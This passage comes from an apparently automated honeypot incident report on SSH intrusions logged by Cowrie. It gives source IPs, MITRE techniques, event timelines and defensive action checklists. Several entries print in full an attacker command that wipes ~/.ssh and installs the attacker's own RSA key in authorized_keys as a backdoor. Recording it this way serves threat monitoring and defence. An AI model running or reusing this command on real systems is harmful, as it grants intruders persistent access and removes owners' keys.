| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:47:50` | `cowrie.session.connect` |
| `2026-05-12 11:47:50` | `cowrie.client.version` |
| `2026-05-12 11:47:50` | `cowrie.client.kex` |
| `2026-05-12 11:47:52` | `cowrie.login.success` |
| `2026-05-12 11:47:53` | `cowrie.session.params` |
| `2026-05-12 11:47:53` | `cowrie.command.input` |
| `2026-05-12 11:47:53` | `cowrie.command.failed` |
| `2026-05-12 11:47:54` | `cowrie.log.closed` |
| `2026-05-12 11:47:56` | `cowrie.session.params` |
| `2026-05-12 11:47:56` | `cowrie.command.input` |
| `2026-05-12 11:47:56` | `cowrie.session.file_download` |
| `2026-05-12 11:47:56` | `cowrie.log.closed` |
| `2026-05-12 11:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.4.3[.]135` to AbuseIPDB if not already reported
- [ ] Block `189.4.3[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698d757ef04e

| Field | Detail |
|---|---|
| **Source IP** | `189.4.3[.]135` |
| **First Seen** | 2026-05-12 11:48 |
| **Last Seen** | 2026-05-12 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:48:00` | `cowrie.session.connect` |
| `2026-05-12 11:48:00` | `cowrie.client.version` |
| `2026-05-12 11:48:00` | `cowrie.client.kex` |
| `2026-05-12 11:48:03` | `cowrie.login.success` |
| `2026-05-12 11:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.4.3[.]135` to AbuseIPDB if not already reported
- [ ] Block `189.4.3[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec1a5b7bcc0

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:11 |
| **Last Seen** | 2026-05-12 12:11 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:11:03` | `cowrie.session.connect` |
| `2026-05-12 12:11:03` | `cowrie.client.version` |
| `2026-05-12 12:11:04` | `cowrie.client.kex` |
| `2026-05-12 12:11:07` | `cowrie.login.success` |
| `2026-05-12 12:11:08` | `cowrie.session.params` |
| `2026-05-12 12:11:08` | `cowrie.command.input` |
| `2026-05-12 12:11:08` | `cowrie.command.failed` |
| `2026-05-12 12:11:09` | `cowrie.log.closed` |
| `2026-05-12 12:11:11` | `cowrie.session.params` |
| `2026-05-12 12:11:11` | `cowrie.command.input` |
| `2026-05-12 12:11:12` | `cowrie.session.file_download` |
| `2026-05-12 12:11:12` | `cowrie.log.closed` |
| `2026-05-12 12:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36968fc98aa7

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:11 |
| **Last Seen** | 2026-05-12 12:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:11:18` | `cowrie.session.connect` |
| `2026-05-12 12:11:18` | `cowrie.client.version` |
| `2026-05-12 12:11:18` | `cowrie.client.kex` |
| `2026-05-12 12:11:21` | `cowrie.login.success` |
| `2026-05-12 12:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb35c399627

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:14 |
| **Last Seen** | 2026-05-12 12:14 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:14:38` | `cowrie.session.connect` |
| `2026-05-12 12:14:38` | `cowrie.client.version` |
| `2026-05-12 12:14:38` | `cowrie.client.kex` |
| `2026-05-12 12:14:41` | `cowrie.login.success` |
| `2026-05-12 12:14:43` | `cowrie.session.params` |
| `2026-05-12 12:14:43` | `cowrie.command.input` |
| `2026-05-12 12:14:43` | `cowrie.command.failed` |
| `2026-05-12 12:14:44` | `cowrie.log.closed` |
| `2026-05-12 12:14:45` | `cowrie.session.params` |
| `2026-05-12 12:14:45` | `cowrie.command.input` |
| `2026-05-12 12:14:46` | `cowrie.session.file_download` |
| `2026-05-12 12:14:46` | `cowrie.log.closed` |
| `2026-05-12 12:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7463b4b9391

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:14 |
| **Last Seen** | 2026-05-12 12:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:14:52` | `cowrie.session.connect` |
| `2026-05-12 12:14:52` | `cowrie.client.version` |
| `2026-05-12 12:14:53` | `cowrie.client.kex` |
| `2026-05-12 12:14:55` | `cowrie.login.success` |
| `2026-05-12 12:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df46cd290444

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:17 |
| **Last Seen** | 2026-05-12 12:18 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:17:56` | `cowrie.session.connect` |
| `2026-05-12 12:17:56` | `cowrie.client.version` |
| `2026-05-12 12:17:57` | `cowrie.client.kex` |
| `2026-05-12 12:18:00` | `cowrie.login.success` |
| `2026-05-12 12:18:02` | `cowrie.session.params` |
| `2026-05-12 12:18:02` | `cowrie.command.input` |
| `2026-05-12 12:18:02` | `cowrie.command.failed` |
| `2026-05-12 12:18:03` | `cowrie.log.closed` |
| `2026-05-12 12:18:04` | `cowrie.session.params` |
| `2026-05-12 12:18:04` | `cowrie.command.input` |
| `2026-05-12 12:18:04` | `cowrie.session.file_download` |
| `2026-05-12 12:18:04` | `cowrie.log.closed` |
| `2026-05-12 12:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a442e5035c6

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:18 |
| **Last Seen** | 2026-05-12 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:18:11` | `cowrie.session.connect` |
| `2026-05-12 12:18:12` | `cowrie.client.version` |
| `2026-05-12 12:18:12` | `cowrie.client.kex` |
| `2026-05-12 12:18:14` | `cowrie.login.success` |
| `2026-05-12 12:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98d4d02a905

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:19 |
| **Last Seen** | 2026-05-12 12:19 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:19:37` | `cowrie.session.connect` |
| `2026-05-12 12:19:37` | `cowrie.client.version` |
| `2026-05-12 12:19:38` | `cowrie.client.kex` |
| `2026-05-12 12:19:41` | `cowrie.login.success` |
| `2026-05-12 12:19:42` | `cowrie.session.params` |
| `2026-05-12 12:19:42` | `cowrie.command.input` |
| `2026-05-12 12:19:42` | `cowrie.command.failed` |
| `2026-05-12 12:19:43` | `cowrie.log.closed` |
| `2026-05-12 12:19:44` | `cowrie.session.params` |
| `2026-05-12 12:19:44` | `cowrie.command.input` |
| `2026-05-12 12:19:45` | `cowrie.session.file_download` |
| `2026-05-12 12:19:45` | `cowrie.log.closed` |
| `2026-05-12 12:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0cc391e8fa

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:19 |
| **Last Seen** | 2026-05-12 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:19:50` | `cowrie.session.connect` |
| `2026-05-12 12:19:50` | `cowrie.client.version` |
| `2026-05-12 12:19:51` | `cowrie.client.kex` |
| `2026-05-12 12:19:54` | `cowrie.login.success` |
| `2026-05-12 12:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c502fcdf87f

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:21 |
| **Last Seen** | 2026-05-12 12:21 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:21:19` | `cowrie.session.connect` |
| `2026-05-12 12:21:19` | `cowrie.client.version` |
| `2026-05-12 12:21:20` | `cowrie.client.kex` |
| `2026-05-12 12:21:23` | `cowrie.login.success` |
| `2026-05-12 12:21:24` | `cowrie.session.params` |
| `2026-05-12 12:21:24` | `cowrie.command.input` |
| `2026-05-12 12:21:24` | `cowrie.command.failed` |
| `2026-05-12 12:21:25` | `cowrie.log.closed` |
| `2026-05-12 12:21:26` | `cowrie.session.params` |
| `2026-05-12 12:21:26` | `cowrie.command.input` |
| `2026-05-12 12:21:27` | `cowrie.session.file_download` |
| `2026-05-12 12:21:27` | `cowrie.log.closed` |
| `2026-05-12 12:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499da6884d0c

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:21 |
| **Last Seen** | 2026-05-12 12:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:21:33` | `cowrie.session.connect` |
| `2026-05-12 12:21:33` | `cowrie.client.version` |
| `2026-05-12 12:21:34` | `cowrie.client.kex` |
| `2026-05-12 12:21:36` | `cowrie.login.success` |
| `2026-05-12 12:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec9e65ebfee

| Field | Detail |
|---|---|
| **Source IP** | `124.18.182[.]99` |
| **First Seen** | 2026-05-12 12:25 |
| **Last Seen** | 2026-05-12 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:25:37` | `cowrie.session.connect` |
| `2026-05-12 12:25:37` | `cowrie.client.version` |
| `2026-05-12 12:25:37` | `cowrie.client.kex` |
| `2026-05-12 12:25:38` | `cowrie.login.success` |
| `2026-05-12 12:25:38` | `cowrie.session.params` |
| `2026-05-12 12:25:38` | `cowrie.command.input` |
| `2026-05-12 12:25:38` | `cowrie.command.failed` |
| `2026-05-12 12:25:38` | `cowrie.log.closed` |
| `2026-05-12 12:25:39` | `cowrie.session.params` |
| `2026-05-12 12:25:39` | `cowrie.command.input` |
| `2026-05-12 12:25:39` | `cowrie.session.file_download` |
| `2026-05-12 12:25:39` | `cowrie.log.closed` |
| `2026-05-12 12:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.18.182[.]99` to AbuseIPDB if not already reported
- [ ] Block `124.18.182[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd2e096614b7

| Field | Detail |
|---|---|
| **Source IP** | `124.18.182[.]99` |
| **First Seen** | 2026-05-12 12:25 |
| **Last Seen** | 2026-05-12 12:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:25:41` | `cowrie.session.connect` |
| `2026-05-12 12:25:41` | `cowrie.client.version` |
| `2026-05-12 12:25:41` | `cowrie.client.kex` |
| `2026-05-12 12:25:42` | `cowrie.login.success` |
| `2026-05-12 12:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.18.182[.]99` to AbuseIPDB if not already reported
- [ ] Block `124.18.182[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ff5d0fabd9

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-12 12:25 |
| **Last Seen** | 2026-05-12 12:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:25:42` | `cowrie.session.connect` |
| `2026-05-12 12:25:42` | `cowrie.client.version` |
| `2026-05-12 12:25:42` | `cowrie.client.kex` |
| `2026-05-12 12:25:43` | `cowrie.login.success` |
| `2026-05-12 12:25:44` | `cowrie.session.params` |
| `2026-05-12 12:25:44` | `cowrie.command.input` |
| `2026-05-12 12:25:44` | `cowrie.command.failed` |
| `2026-05-12 12:25:44` | `cowrie.log.closed` |
| `2026-05-12 12:25:45` | `cowrie.session.params` |
| `2026-05-12 12:25:45` | `cowrie.command.input` |
| `2026-05-12 12:25:45` | `cowrie.session.file_download` |
| `2026-05-12 12:25:45` | `cowrie.log.closed` |
| `2026-05-12 12:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7820e87ec6

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-12 12:25 |
| **Last Seen** | 2026-05-12 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:25:48` | `cowrie.session.connect` |
| `2026-05-12 12:25:48` | `cowrie.client.version` |
| `2026-05-12 12:25:49` | `cowrie.client.kex` |
| `2026-05-12 12:25:50` | `cowrie.login.success` |
| `2026-05-12 12:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca3a5643138

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:28 |
| **Last Seen** | 2026-05-12 12:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:28:05` | `cowrie.session.connect` |
| `2026-05-12 12:28:05` | `cowrie.client.version` |
| `2026-05-12 12:28:06` | `cowrie.client.kex` |
| `2026-05-12 12:28:09` | `cowrie.login.success` |
| `2026-05-12 12:28:11` | `cowrie.session.params` |
| `2026-05-12 12:28:11` | `cowrie.command.input` |
| `2026-05-12 12:28:11` | `cowrie.command.failed` |
| `2026-05-12 12:28:11` | `cowrie.log.closed` |
| `2026-05-12 12:28:12` | `cowrie.session.params` |
| `2026-05-12 12:28:12` | `cowrie.command.input` |
| `2026-05-12 12:28:14` | `cowrie.session.file_download` |
| `2026-05-12 12:28:14` | `cowrie.log.closed` |
| `2026-05-12 12:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8207fd8c210

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:28 |
| **Last Seen** | 2026-05-12 12:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:28:20` | `cowrie.session.connect` |
